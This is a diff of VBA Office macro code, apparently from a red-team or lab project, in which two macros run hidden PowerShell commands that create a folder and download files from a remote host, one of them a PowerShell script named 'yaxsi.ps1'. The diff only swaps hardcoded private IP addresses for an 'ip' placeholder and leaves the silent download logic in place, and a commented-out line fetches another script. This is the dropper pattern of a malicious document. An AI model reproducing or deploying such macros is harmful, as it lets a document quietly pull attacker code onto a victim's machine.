@@ -70,7 +70,7 @@ Sub InsertImage()
     str1 = "powershell new-item c:\dir3 -itemtype directory"
     Shell str1, vbHide
     Dim str2 As String
-    str2 = "powershell Invoke-WebRequest 'http://10.145.1.16/logo.png' -OutFile C:\dir3\logo.png"
+        str2 = "powershell Invoke-WebRequest 'ip/logo.png' -OutFile C:\dir3\logo.png"
     Shell str2, vbHide
     
     Dim imagePath As String
@@ -97,7 +97,7 @@ Sub MyMacro()
     'MsgBox ("hello")
     Set objShell = CreateObject("Wscript.Shell")
     Dim str As String
-    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://10.145.1.16/yaxsi.ps1', 'yaxsi.ps1')"
+        str = "powershell (New-Object System.Net.WebClient).DownloadFile(ip/yaxsi.ps1', 'yaxsi.ps1')"
     'str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.4/test.ps1', 'test.ps1')"
     Shell str, vbHide
     Dim docPath As String
